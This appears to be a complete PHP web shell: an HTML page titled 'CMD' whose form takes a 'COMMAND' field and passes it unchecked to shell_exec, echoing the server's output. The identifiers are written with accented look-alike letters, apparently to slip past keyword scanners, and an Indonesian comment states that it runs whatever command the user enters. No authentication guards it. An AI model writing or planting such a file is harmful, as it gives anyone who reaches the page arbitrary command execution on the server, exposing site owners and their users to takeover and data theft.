<!DOCTYPE html>
<html>
<head>
    <title>ČM̃Ď</title>
</head>
<body>
    <center>
    <h1>ČM̃Ď</h1>
    <form method="post">
        <label for="ČŐM̄M̄ĀŃĎ">ČŐM̄M̄ĀŃĎ:</label>
        <input type="text" name="ČŐM̄M̄ĀŃĎ" id="ČŐM̄M̄ĀŃĎ" placeholder="Enter ČŐM̄M̄ĀŃĎ" required>
        <input type="submit" value="Go">
    </form>
    
    <hr>
    
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $ČŐM̄M̄ĀŃĎ = $_POST['ČŐM̄M̄ĀŃĎ'];

        // Menjalankan perintah yang dimasukkan pengguna
        $output = shell_exec($ČŐM̄M̄ĀŃĎ);
        echo "<pre>$output</pre>";
    }
    ?>
    
    </center>
</body>
</html>
